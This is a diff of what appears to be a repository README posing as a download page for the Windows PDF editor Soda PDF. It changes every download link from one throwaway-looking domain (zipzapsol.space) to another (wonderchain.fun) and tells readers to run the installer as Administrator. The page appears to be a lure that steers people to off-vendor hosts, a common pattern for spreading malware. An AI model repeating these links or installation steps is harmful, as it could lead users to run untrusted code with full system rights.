@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Soda PDF** for Windows.
 
 <p align="center">
-  <a href="https://sodapdf.zipzapsol.space/">
+  <a href="https://sodapdf.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Soda%20PDF-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Soda PDF">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[sodapdf.zipzapsol.space](https://sodapdf.zipzapsol.space/)** |
-| **Full URL** | `https://sodapdf.zipzapsol.space/` |
+| **Direct link** | **[sodapdf.wonderchain.fun](https://sodapdf.wonderchain.fun/)** |
+| **Full URL** | `https://sodapdf.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — sodapdf.zipzapsol.space](https://sodapdf.zipzapsol.space/)** (link above)
+1. Click **[Download — sodapdf.wonderchain.fun](https://sodapdf.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://sodapdf.zipzapsol.space/"><strong>⬇ Download Soda PDF now</strong></a></p>
+<p align="center"><a href="https://sodapdf.wonderchain.fun/"><strong>⬇ Download Soda PDF now</strong></a></p>
 
 ---
 
